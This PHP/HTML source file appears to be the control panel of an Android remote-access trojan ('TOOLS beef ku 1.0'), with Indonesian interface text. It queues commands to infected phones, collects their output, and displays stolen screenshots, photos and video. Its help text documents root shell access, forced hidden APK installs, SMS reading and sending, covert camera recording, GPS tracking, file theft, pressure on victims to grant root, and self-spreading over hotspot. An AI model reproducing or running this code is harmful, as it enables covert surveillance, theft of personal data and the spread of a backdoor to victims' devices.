<!DOCTYPE html>
<html>
  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalabe=no"/>
    <title>TOOLS beef ku 1.0</title>
    <!--[if IE]><script type="text/javascript" src="excanvas.js"></script><![endif]-->
  </head>
  <body>

    <form action="" method="post">
        <input type="submit" name="btnlog" value="Log">
        <input type="submit" name="btnTarget" value="Select target">
        <h3><font color='black'>
            SWITCH : 
            <?php
                $rofile = fopen("swthread.txt", "r") or die("Gagal membuka file!");
                $sw = fread($rofile, filesize("swthread.txt"));
                fclose($rofile);

                if ($sw == "hidup") {
                    echo "<font color='red'> hidup </font>";
                    echo "<script>alert('WARNING super aktif');</script>";
                } else {
                    echo "<font color='blue'> mati </font>";
                }
            ?>

            </font>
        </h3>
        <br><br><br>

        <h3>
            <font color='blue'>
                target : 
                <?php

                if (isset($_GET['target'])) {
                    $target = $_GET['target'];

                    $tfile = fopen("target.txt", "w");
                    fwrite($tfile, $target);
                    fclose($tfile);

                    $rtfile = fopen("target.txt", "r") or die("Gagal membuka file!");
                    echo fread($rtfile, filesize("target.txt"));
                    fclose($rtfile);

                    $rsfile = fopen("swthread.txt", "r") or die("Gagal membuka file!");
                    $sw = fread($rsfile, filesize("swthread.txt"));
                    fclose($rsfile);
                } 
                else {
                    $dir_target = dirname(__FILE__)."/listclient/";
                    echo "<a href='/pfileman.php?folder=".$dir_target."'> select target </a>";

                    $rtfile = fopen("target.txt", "r") or die("Gagal membuka file!");
                    echo fread($rtfile, filesize("target.txt"));
                    fclose($rtfile);
                }

                ?>
            </font>
        </h3>
        <?php 

        echo "kfkd:".dirname(__FILE__);

        ?>

        <h5>input : <?php
            $rifile = fopen('inpayload.txt', 'r') or die('Gagal membuka file!');
            $text = fread($rifile, filesize('inpayload.txt'));
            echo $text;

            fclose($rifile);
            ?>
        </h5>
        <h5>baleni : <?php
            $rifile = fopen('baleni.txt', 'r') or die('Gagal membuka file!');
            $text = fread($rifile, filesize('baleni.txt'));
            echo $text;

            fclose($rifile);
            ?>

        </h5>
        <input type="submit" name="btnRefresh" value="Reload..."><br><br>

        <textarea
            name="edt" 
            cols="22" rows="1" 
            tabindex="101" 
            data-wz-state="8" 
            data-min-length="">
        </textarea>
        <input type="submit" name="enter" value="Enter">
        <input type="submit" name="baleni" value="Baleni">
        <br><br>
        <br><br>

        <h3>
            -------------------------- OUTPUT ----------<br><br>
            <a href="/payload.php?resetoutpayload=">reset</a> <font color='green'>size: 
            <?php 
                function size($size) {
                    $size = max(0, (int)$size);
                    $units = array( 'b', 'Kb', 'Mb', 'Gb', 'Tb', 'Pb', 'Eb', 'Zb', 'Yb');
                    $power = $size > 0 ? floor(log($size, 1024)) : 0;
                    return number_format($size / pow(1024, $power), 2, '.', ',')." ".$units[$power];
                }
                $logsize = size(filesize(dirname(__FILE__)."/outpayload.txt"));
                echo $logsize;

            ?>
            </font>
            <?php
            $rofile = fopen("outpayload.txt", "r") or die("Gagal membuka file!");
            $odata = fread($rofile, filesize("outpayload.txt"));
            fclose($rofile);
            
            echo "<pre>";
            echo $odata;
            echo "</pre>";

            ?> <br><br>
            -------------------------- OUTPUT -----------

        </h3><br>
        <a href='/payload.php?img=screen.jpg'> show screen</a><br><br>
        <a href='/payload.php?img=foto.jpg'> show foto</a><br><br>
        <a href='/payload.php?video=REC_SYSTEM.mp4'> show video</a><br><br>
        <a href='/fileman.php?folder=payloadout/'> data payload</a><br><br>

    </form>

  </body>
</html>

<?php

echo "request : https://revdownload.com/index.php?id=strike-fighters-android&hash=44708da8373a8ba77d15192e03954d8ecc8dc6c2ab95be7f4651889f4074ab4d&token=1545952808";

echo "<br><br><br>";
echo "adit : https://docs.google.com/uc?export=download&id=1Xe5u0MY7ev0cK4WgH7IHJP7anXKGXLHz";
echo "<br><br><br>";

echo "space apk : https://docs.google.com/uc?export=download&id=1WzDLg34O2oMG1n99GVqvMIMBwINivcec";
echo "<br><br><br>";
echo "space data : http://dl1.revdownload.com/dl1/1701/Space_Simulator_v111__6330_Revdl.com.zip";
echo "<br><br><br>";

echo "facebook : https://docs.google.com/uc?export=download&id=1EQkdqf3zvvFsdVDEzmy7Dkr5EKwZbQcs";
echo "<br><br><br>";
echo "jt urip : https://docs.google.com/uc?export=download&id=1toO3eAzlFJdDsZlJ63HmRXChKw53ehu1";
echo "<br><br><br>";
echo "adit mate : https://docs.google.com/uc?export=download&id=1Rja0oY02uOG2n9M-hUwUIsN23999al-x";
echo "<br><br><br>";
echo "https://drive.google.com/open?id=";

if (isset($_GET['img'])) {
    $dirimg = "payloadout";
    $data = $_GET['img'];
    if ($data == "foto.jpg") {
       echo "<img src='".$dirimg."/foto.jpg'></img>";
    } 
    else {
       echo "<img src='".$dirimg."/screen.jpg'></img>";
    }
}

if (isset($_GET['video'])) {
    $dirvideo = dirname(__FILE__)."/payloadout";

    echo "<video width='320' height='240' controls>";
    echo "<source src='"."payloadout"."/".$_GET['video']."' type='video/mp4'>";
    echo "</video>";
    echo $dirvideo;
}

if (isset($_GET['client'])) {
    $data = $_GET['client'];
    $curdir = dirname(__FILE__)."/listclient";

    unlink($curdir."/".$data);

    $wcfile = fopen("listclient/".$data, "w");
    fwrite($wcfile, $data);
    fclose($wcfile);
}
else if (isset($_GET['resetoutpayload'])) {
    $data = $_GET['resetoutpayload'];

    $ofile = fopen("outpayload.txt", "w");
    fwrite($ofile, $data);
    fclose($ofile);
    header("Location: /payload.php");
}
else if (isset($_GET['outpayload'])) {
    $data = $_GET['outpayload'];

    $ofile = fopen("outpayload.txt", "a");
    fwrite($ofile, $data);
    fclose($ofile);
}

else if(isset($_GET['inpayload'])) {
    $data = $_GET['inpayload'];

    $file = fopen("inpayload.txt", "w");
    fwrite($file, $data);
    fclose($file);
}
else if(isset($_POST['btnlog'])) {
    header("Location: /pfileman.php");
}
else if(isset($_POST['btnRefresh'])) {
    header("Location: /payload.php");
}
else if(isset($_POST['btnTarget'])) {
    $dir_target = dirname(__FILE__)."/listclient/";
    header("Location: /pfileman.php?folder=".$dir_target);
}

if(isset($_POST['baleni'])) {
    $file = fopen("baleni.txt", "r") or die("Gagal membuka file!");
    $data = fread($file, filesize("baleni.txt"));
    fclose($file);

    echo $data;

    $file = fopen("inpayload.txt", "w");         
    fwrite($file, $data);
    fclose($file);
}
if(isset($_POST['enter'])) {
    $data = $_POST['edt'];
    if ($data == "hidup" || $data == "mati") 
    {
        $file = fopen("swthread.txt", "w");
        fwrite($file, $data);
        fclose($file);
    }
    else if($data == "screen") {
        $file = fopen("inpayload.txt", "w");
        fwrite($file, $data);
        fclose($file);

        echo "<img src='payloadout/oke.jpg'></img>";
    }
    else if($data == "bantuan") {
        echo "<b>-_-</b> untuk mode terminal sbg contoh>> <font color='green'><b>-_-ls /sdcard/</b></font> <br><br>".
            "<b>-su-</b> super user terminal sbg contoh>> <font color='green'><b>-su-pm install /sdcard/busybox.apk</b></font> <br><br>".
            "<b>-out-</b> handle output contoh>> <font color='green'><b>-out-UTF-16</b></font> default adalah utf-16 <br><br>".
            "<b>-net-</b> handle data selules contoh>> <font color='blue'><b>-net-hidup/mati</b></font> ingat harus root <br><br>".
            "<b>-audio-</b> manjalankan musik contogh <font color='blue'><b>-audio-/sdcard/halo.mp3-audio-start/stop</b></font><br><br>".
            "<b>-cam-</b> : untuk merekam target contoh <font color='blue'><b>-cam-depan/back</b></font> tambahkan parameter kedua untuk HD video misal <font color='blue'><b>-cam-back-cam-1</b></font> parameter ketiga bisa ditambahkan batas size contoh <font color='blue'><b>-cam-back-cam-1-cam-2142825</b></font> ingat satuanya byte dicontoh adalah 2MB ".
            "jangan lupa masukan perintah <font color='blue'><b>-up-video</b></font> untuk upload hasil rekam<br><br>".
            "<b>-foto-</b> : [buck kamera belakang] untuk foto target contoh <font color='blue'><b>-foto-depan/back</b></font> jangan lupa masukan perintah <font color='blue'><b>-up-foto</b></font> untuk upload hasil foto <br><br>".
            "<b>-app-</b> : untuk membuka aplikasi contoh <font color='blue'><b>-app-com.busybox</b></font><br><br>".
            "<b>-install-</b> : untuk paksa install aplikasi contoh <font color='blue'><b>-install-/sdcard/nama.apk-install-com.nama.paket</b></font> ini memiliki alert peringatan yang menutupi nama aplikasi dan ijin playstore".
            "<br>install bisa dari data asset contoh <font color='blue'><b>-install-/sdcard/system.apk-install-os.system-install-system.apk</b></font> paramerter ketiga adalah nama file diasset, hasil extrak disimpan di /sdcard/   <b>ingat nama apk harus sama dg parameter ketiga</b><br><br>".
            "<b>-sms-</b> : untuk aksi sms contoh baca<font color='blue'><b>-sms-baca</b></font> untuk kirim <font color='blue'><b>-sms-isi_pesan-sms-082324379134</b></font><br><br>".
            "<b>-up-</b> : untuk upload file contoh <font color='blue'><b>-up-/sdcard/penting.txt</font></b> file disimpan di server folder payloadout. tambahan upload video/audio dan gambar contoh <font color='blue'><b>-up-video/screen/foto</b></font><br><br>".
            "<b>-down-</b> : untuk download file contoh <font color='blue'><b>-down-exe_hapus.sh-down-/sdcard/data</font></b> file exe_hapus.sh akan disimpan di /sdcard/data [target] ".
            "parameter pertama bisa link misal <font color='blue'><b>-down-https://drive.google.KHGHJgGg-down-/sdcard/data-down-busybox.apk</b></font> INGAT parameter ketiga harus diisi nama file<br><br>".
            "<b>screen</b> : upload screenshoot INGAT harus root<br><br>".
            "<b>layar</b> : menyalakan layar dari tidur<br><br>".
            "<b>server</b> : download dan install server lighttpd <b>ingat link download harus berfungsi, jika download telah selesai panggil lagi untuk running</b><br><br>".
            "<b>status</b> : melihat status switch, server, batery dll<br><br>".
            "<b>gps</b> : mencari lokasi target <br><br>".
            "<b>-/-</b> : menyimpan text contoh <font color='blue'><b>-/-ini text yang disimpan-/-test.txt</b></font> tersimpan difolder default yaitu Andoid/data/com.runtime.android.system<br><br>".
            "<b>cekroot</b> : untuk cek root ponsel<br><br>".
            "<b>pakroot</b> : memaksa user untuk allow superuser ini memiliki alert peringatan<br><br>".
            "<b>-alert-</b> : toast paksa contoh <font color='blue'><b>-alert-text pesan-alert-warna-alert-letak-alert-1000</b></font> parameter letak: atas/bawah/tengah atau atas&tengah/bawah&tengah<br>  paramter warna: biru/merah/kuning/hijau ".
            "untuk memakai default adalah warna [kuning] letak [atas] waktu [7.5 detik(7500)] contoh <font color='blue'><b>-alert-pesawat terbang</b></font>".
            " untuk alert image contoh <font color='blue'><b>-alert-?img?-alert-/sdcard/setan.jpg-alert-letak-alert-3000</b></font><br><br>".
            "<b>alert</b> : mengetes terhubung atau tidak<br><br>".
            "<b>hidup/mati</b> : mode super atau menghidupkan fitur paksa misal install apk update apk root dll, catatan : backdoor akan ".
            "             akan otomatis tersebar via hotspot jadi hati2 untuk menghidupkan mode ini,<br><br>";
    } 
    else 
    {

        $file = fopen("inpayload.txt", "w");         
        fwrite($file, $data);
        fclose($file);

        $file = fopen("baleni.txt", "w");         
        fwrite($file, $data);
        fclose($file);

        echo $data;
    }
}

?>


